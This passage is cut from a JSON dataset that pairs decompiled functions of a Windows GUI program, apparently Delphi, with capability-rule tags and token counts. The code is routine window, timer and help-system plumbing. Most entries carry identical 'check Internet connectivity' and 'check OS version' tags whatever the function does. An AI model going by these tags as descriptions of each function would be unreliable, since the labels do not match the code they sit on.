        "decompiled_code": "\nvoid fcn.00434484(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint auStack128 [10];\n    uchar auStack88 [76];\n    \n    auStack128[0] = 0;\n    uVar1 = sub.user32.dll_GetDC();\n    sub.gdi32.dll_GetTextMetricsA(uVar1, auStack128);\n    uVar2 = fcn.0042614c();\n    uVar2 = sub.gdi32.dll_SelectObject(uVar1, uVar2);\n    sub.gdi32.dll_GetTextMetricsA(uVar1, auStack88);\n    sub.gdi32.dll_SelectObject(uVar1, uVar2);\n    sub.user32.dll_ReleaseDC(0, uVar1);\n    if (**0x484538 == '\\0') {\n        sub.user32.dll_GetSystemMetrics(6);\n    }\n    else {\n        sub.user32.dll_GetSystemMetrics(6);\n    }\n    fcn.0043d028();\n    return;\n}\n",
        "token_count": 216
    },
    "00434930": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00434930(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    fcn.00440ed0();\n    if (*(in_EAX + 0x209) != '\\0') {\n        *(param_2 + 4) = *(param_2 + 4) | 0x2000;\n    }\n    return;\n}\n",
        "token_count": 89
    },
    "00435f90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00435f90(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint nBottomRect;\n    uint *puVar2;\n    uint var_1ch;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = in_EAX;\n    if ((*(in_EAX + 0x1c) & 0x10) != 0) {\n        if (*(in_EAX + 0x169) == '\\x06') {\n            fcn.00426700();\n            fcn.004266e4();\n            fcn.00426624();\n            fcn.00426a20();\n            uVar1 = fcn.0043d24c();\n            nBottomRect = fcn.0043d290();\n            fcn.00426de4(nBottomRect, uVar1);\n            return;\n        }\n        fcn.00426700();\n        fcn.004266e4();\n        fcn.00426624();\n        fcn.00426a20();\n    }\n    fcn.00426730();\n    if (*(var_4h + 0x168) == '\\0') {\n        var_8h = 0xff000010;\n        var_ch = 0xff000014;\n    }\n    else {\n        var_8h = 0xff000014;\n        var_ch = 0xff000010;\n    }\n    uVar1 = var_8h;\n    if (*(var_4h + 0x169) < 6) {\n    // switch table (6 cases) at 0x436082\n        switch(*(*(var_4h + 0x169) * 4 + 0x436082)) {\n        case 0x43609a:\n            puVar2 = &var_1ch;\n            fcn.0041b080(puVar2, *(var_4h + 0x4c) + -1);\n            fcn.00435e60(puVar2);\n            break;\n        case 0x4360c5:\n            var_8h = var_ch;\n            puVar2 = &var_1ch;\n            fcn.0041b080(puVar2, *(var_4h + 0x4c) + -1);\n            fcn.00435e60(puVar2);\n            var_ch = uVar1;\n            puVar2 = &var_1ch;\n            var_8h = uVar1;\n            fcn.0041b080(puVar2, *(var_4h + 0x4c) + -2);\n            fcn.00435e60(puVar2);\n            break;\n        case 0x43612f:\n            fcn.00435f50(0, *(var_4h + 0x48), &stack0xfffffffc);\n            fcn.00435f50(1, *(var_4h + 0x48), &stack0xfffffffc);\n            break;\n        case 0x436165:\n            fcn.00435f50(*(var_4h + 0x4c) + -2, *(var_4h + 0x48), &stack0xfffffffc);\n            fcn.00435f50(*(var_4h + 0x4c) + -1, *(var_4h + 0x48), &stack0xfffffffc);\n            break;\n        case 0x4361a3:\n            fcn.00435f50(*(var_4h + 0x4c), 0, &stack0xfffffffc);\n            fcn.00435f50(*(var_4h + 0x4c), 1, &stack0xfffffffc);\n            break;\n        case 0x4361d6:\n            fcn.00435f50(*(var_4h + 0x4c), *(var_4h + 0x48) + -2, &stack0xfffffffc);\n            fcn.00435f50(*(var_4h + 0x4c), *(var_4h + 0x48) + -1, &stack0xfffffffc);\n        }\n    }\n    return;\n}\n",
        "token_count": 927
    },
    "00436314": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00436314(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffcc;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x436393;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    sub.user32.dll_KillTimer(*(in_EAX + 0x34), 1);\n    if (((*(in_EAX + 0x30) != 0) && (*(in_EAX + 0x40) != '\\0')) && (*(in_EAX + 0x3a) != 0)) {\n        in_stack_ffffffcc = *(in_EAX + 0x34);\n        iVar1 = sub.user32.dll_SetTimer(in_stack_ffffffcc, 1, *(in_EAX + 0x30), 0);\n        if (iVar1 == 0) {\n            fcn.0040675c();\n            fcn.0040c8dc();\n            fcn.00403fc0();\n        }\n    }\n    *in_FS_OFFSET = in_stack_ffffffcc;\n    fcn.004045c8(0x43639a);\n    return;\n}\n",
        "token_count": 303
    },
    "00436544": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00436544(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x436634;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack48;\n    if (*(in_EAX + 0x21d) == '\\0') {\n        fcn.0043d848();\n        iVar2 = in_EAX[0x86];\n        if (*(in_EAX + 0x211) != '\\0') {\n            iVar2 = iVar2 + in_EAX[0x85];\n        }\n        if (*(in_EAX + 0x212) != '\\0') {\n            iVar2 = iVar2 + in_EAX[0x85];\n        }\n        if (0 < iVar2) {\n            var_8h = in_EAX[0x12];\n            var_4h = in_EAX[0x13];\n            if (*(*(param_2 + 8) + 0x10) != var_8h) {\n                var_ch = 0;\n                var_10h = (var_8h - iVar2) + -1;\n                uStack60 = fcn.0044407c(&var_10h, 0xffffffff);\n                sub.user32.dll_InvalidateRect();\n            }\n            if (*(*(param_2 + 8) + 0x14) != var_4h) {\n                var_10h = 0;\n                var_ch = (var_4h - iVar2) + -1;\n                uVar1 = fcn.0044407c(&var_10h, 0xffffffff);\n                sub.user32.dll_InvalidateRect(uVar1);\n            }\n        }\n    }\n    else {\n        uStack44 = 0x436634;\n        puStack40 = &stack0xfffffffc;\n        (**(*in_EAX + 0x7c))();\n    }\n    fcn.00442520();\n    *in_FS_OFFSET = uStack60;\n    fcn.004045c8(0x43663b);\n    return;\n}\n",
        "token_count": 557
    },
    "00436644": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00436644(int32_t arg_8h)\n\n{\n    char in_AL;\n    \n    *(arg_8h + -4) = 0xff000014;\n    if (in_AL == '\\x01') {\n        *(arg_8h + -4) = 0xff000010;\n    }\n    *(arg_8h + -8) = 0xff000010;\n    if (in_AL == '\\x01') {\n        *(arg_8h + -8) = 0xff000014;\n    }\n    return;\n}\n",
        "token_count": 123
    },
    "004368e8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004368e8(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    if (*(in_EAX + 0x17) == '\\0') {\n        puStack44 = 0x436a1b;\n        fcn.00442cd8();\n    }\n    else {\n        *(in_EAX + 0x84) = 1;\n        uStack48 = 0x436a09;\n        uStack52 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffcc;\n        iVar2 = *(param_2 + 4);\n        cVar1 = *(in_EAX + 0x5b);\n        if (cVar1 == '\\x01') {\n            puVar3 = &stack0xfffffffc;\n            if (in_EAX[0x13] == 0) {\n                fcn.0043d028();\n                puVar3 = puStack44;\n            }\n        }\n        else if (cVar1 == '\\x02') {\n            puVar3 = &stack0xfffffffc;\n            if (in_EAX[0x13] == 0) {\n                puStack44 = &stack0xfffffffc;\n                (**(*in_EAX + 0x84))(*(iVar2 + 0x50) - *(iVar2 + 0x48), in_EAX[0x12]);\n                puVar3 = puStack44;\n            }\n        }\n        else if (cVar1 == '\\x03') {\n            puVar3 = &stack0xfffffffc;\n            if (in_EAX[0x12] == 0) {\n                puStack44 = &stack0xfffffffc;\n                fcn.0043d004();\n                puVar3 = puStack44;\n            }\n        }\n        else {\n            puVar3 = &stack0xfffffffc;\n            if ((cVar1 == '\\x04') && (puVar3 = &stack0xfffffffc,  in_EAX[0x12] == 0)) {\n                puStack44 = &stack0xfffffffc;\n                (**(*in_EAX + 0x84))(in_EAX[0x13], *(iVar2 + 0x4c) - *(iVar2 + 0x44));\n                puVar3 = puStack44;\n            }\n        }\n        puStack44 = puVar3;\n        fcn.00442cd8();\n        fcn.0040406c();\n    }\n    return;\n}\n",
        "token_count": 637
    },
    "00437404": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00437404(void)\n\n{\n    uchar *puVar1;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack20;\n    uint32_t uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x437456;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x485a74 = *0x485a74 + 1;\n    if (*0x485a74 == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (*0x483b50 != 0) {\n            uStack20 = *0x483b50;\n            sub.kernel32.dll_GlobalDeleteAtom();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        fcn.00405080();\n    }\n    *in_FS_OFFSET = uStack20;\n    return;\n}\n",
        "token_count": 220
    },
    "00437534": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00437534(uint param_1)\n\n{\n    int32_t in_EAX;\n    uchar *puVar1;\n    int32_t iVar2;\n    \n    fcn.00404888(param_1);\n    fcn.00404c14();\n    puVar1 = fcn.00404a88();\n    iVar2 = fcn.00404888();\n    if (0 < iVar2) {\n        do {\n            *puVar1 = *(in_EAX + -1 + iVar2);\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 150
    },
    "00438044": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00438044(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint in_EDX;\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x43812f;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    arg_8h_00 = 0x438076;\n    cVar1 = fcn.004382bc();\n    if (cVar1 != '\\0') {\n        if ((((arg_ch == 0x102) || (arg_ch == 0x105)) || (arg_ch == 0x201)) ||\n           (((arg_ch == 10 || (arg_ch == 8)) || ((arg_ch == 1 || (arg_ch == 0x101)))))) {\n            arg_8h_00 = 0;\n            fcn.00408c28();\n            cVar1 = fcn.00438214(arg_8h_00);\n        }\n        else {\n            cVar1 = '\\x01';\n        }\n        if (cVar1 != '\\0') {\n            *(in_EAX + 0x10) = 1;\n            fcn.00408c28();\n            fcn.0040461c();\n            fcn.00437978(arg_ch, arg_8h);\n            uVar2 = fcn.00404a88();\n            sub.user32.dll_WinHelpA(in_EDX, uVar2);\n        }\n    }\n    *in_FS_OFFSET = arg_8h_00;\n    uStack44 = 0x438136;\n    uStack48 = 0x43812e;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 460
    },
    "00437dc4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00437dc4(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x437e1d;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (*0x485a94 != NULL) {\n        fcn.00437978();\n        (**(**0x485a94 + 0x10))();\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x437e24;\n    uStack24 = 0x437e1c;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 178
    },
    "00437e2c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00437e2c(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack296;\n    uint uStack292;\n    uchar *puStack288;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    int32_t var_4h;\n    \n    puStack288 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack292 = 0x437f22;\n    uStack296 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffed8;\n    var_108h._0_1_ = 0xb;\n    var_10ch = param_2;\n    fcn.0040994c(0, &fcn.00437e2c::var_10ch);\n    fcn.00437978();\n    uVar2 = 0x437e92;\n    cVar1 = fcn.004382bc();\n    if (cVar1 != '\\0') {\n        uVar2 = 0;\n        fcn.00404838();\n        cVar1 = fcn.00438214(uVar2);\n        if ((cVar1 != '\\0') && (var_4h != 0)) {\n            *(in_EAX + 0x10) = 1;\n            fcn.00404838();\n            uVar2 = fcn.00404a88(0x102, &fcn.00437e2c::var_104h);\n            uVar2 = (**(**(in_EAX + 0x1c) + 0xc))(uVar2);\n            sub.user32.dll_WinHelpA();\n        }\n    }\n    *in_FS_OFFSET = uVar2;\n    fcn.004045c8(0x437f29);\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 450
    },
    "00437f40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00437f40(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x437fa2;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    if (*0x485a94 != NULL) {\n        fcn.00437978();\n        (**(**0x485a94 + 0x14))();\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x437fa9;\n    uStack32 = 0x437fa1;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 182
    },
    "00437fb4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00437ffd)\n\nvoid __fastcall fcn.00437fb4(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x438034;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    fcn.00437978();\n    uVar2 = 0x437fe3;\n    cVar1 = fcn.004382bc();\n    if (cVar1 != '\\0') {\n        fcn.00438214(param_2);\n        uVar2 = param_2;\n    }\n    *in_FS_OFFSET = uVar2;\n    uStack28 = 0x43803b;\n    uStack32 = 0x438033;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 239
    },
    "00437a84": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00437a84(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x437aeb;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (*0x485a94 != NULL) {\n        fcn.00437978();\n        (**(**0x485a94 + 0xc))();\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x437af2;\n    uStack24 = 0x437aea;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 174
    },
    "00437afc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00437afc(uint param_1, uint param_2)\n\n{\n    int32_t *piVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x437b84;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    if (*0x485a94 == NULL) {\n        piVar1 = fcn.004037f0();\n        fcn.00437a70();\n        fcn.00404948(param_2, 0x437b9c, 0);\n        (**(*piVar1 + 0x38))();\n    }\n    else {\n        puStack28 = &stack0xfffffffc;\n        (**(**0x485a94 + 0x18))();\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x437b8b;\n    uStack32 = 0x437b83;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 265
    },
    "00437ba4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00437be9)\n\nvoid fcn.00437ba4(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x437c1f;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    cVar1 = fcn.004382bc();\n    if (cVar1 != '\\0') {\n        *(in_EAX + 0x10) = 2;\n        (**(**(in_EAX + 0x1c) + 0x10))();\n        fcn.00437978();\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x437c26;\n    uStack24 = 0x437c1e;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 246
    },
    "00437c2c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00437ccd)\n\nvoid __fastcall fcn.00437c2c(uint param_1, int32_t param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint *arg_8h;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack48 = 0x437d24;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puVar1 = &stack0xfffffffc;\n    if (param_2 == 0) {\n        fcn.0040c998();\n        fcn.00403fc0();\n        puVar1 = puStack44;\n    }\n    puStack44 = puVar1;\n    arg_8h = &fcn.00437c2c::var_4h;\n    fcn.00437978();\n    fcn.00409998(arg_8h);\n    uVar3 = 0x437ca5;\n    cVar2 = fcn.004382bc();\n    if (cVar2 != '\\0') {\n        fcn.00437978();\n        uVar3 = 0;\n        fcn.00438214(0);\n    }\n    *in_FS_OFFSET = uVar3;\n    uStack52 = 0x437d2b;\n    fcn.004045c8();\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 402
    },
    "00437978": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00437978(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x437a2d;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    fcn.004045c8();\n    if ((param_2 == 0) && (*(in_EAX + 0x1c) != 0)) {\n        (**(**(in_EAX + 0x1c) + 0x10))();\n    }\n    else {\n        fcn.00404660();\n    }\n    if (*0x485a94 != NULL) {\n        (**(**0x485a94 + 0x20))();\n    }\n    if (*0x485a94 != NULL) {\n        (**(**0x485a94 + 0x1c))();\n        puStack28 = NULL;\n        uStack32 = 0x437a44;\n        uStack36 = 0;\n        fcn.00404948();\n    }\n    fcn.0040461c();\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x437a34;\n    uStack32 = 0x437a2c;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 340
    },
    "00437a48": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00437a48(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.00437d78();\n    if (*(in_EAX + 0x1c) != 0) {\n        (**(**(in_EAX + 0x1c) + 0x14))();\n        fcn.00406298();\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "00438214": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00438214(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    char in_DL;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack40 = 0x43822b;\n    fcn.00404a78();\n    uStack44 = 0x43828a;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.004381f8();\n    if ((((var_ch != '\\0') && (in_DL == *(in_EAX + 0x10))) && (in_DL != '\\0')) && (in_DL == '\\x01')) {\n        fcn.00408950();\n    }\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x438291;\n    uStack44 = 0x438289;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 259
    },
    "004382bc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004382bc(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uVar3;\n    uchar auStack24 [4];\n    uint uStack20;\n    char cStack12;\n    \n    uVar3 = 0;\n    fcn.004381f8();\n    if (cStack12 != '\\0') {\n        uVar2 = sub.user32.dll_GetWindowThreadProcessId(uStack20, 0, fcn.004381a0, auStack24);\n        sub.user32.dll_EnumThreadWindows(uVar2);\n    }\n    cVar1 = fcn.0043829c();\n    if (cVar1 == '\\0') {\n        cVar1 = fcn.004382a0();\n        if (cVar1 != '\\0') {\n            fcn.00438318();\n        }\n        uVar3 = 1;\n    }\n    return uVar3;\n}\n",
        "token_count": 201
    },
    "00438318": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00438364)\n\nvoid fcn.00438318(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x438395;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    fcn.00437d78();\n    iVar1 = sub.kernel32.dll_GetTickCount();\n    do {\n        uStack28 = 0;\n        sub.kernel32.dll_Sleep();\n        iVar2 = sub.kernel32.dll_GetTickCount();\n    } while (iVar2 - iVar1 < 0x3e9);\n    fcn.00437978();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x43839c;\n    uStack24 = 0x438394;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 240
    },
    "00438418": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
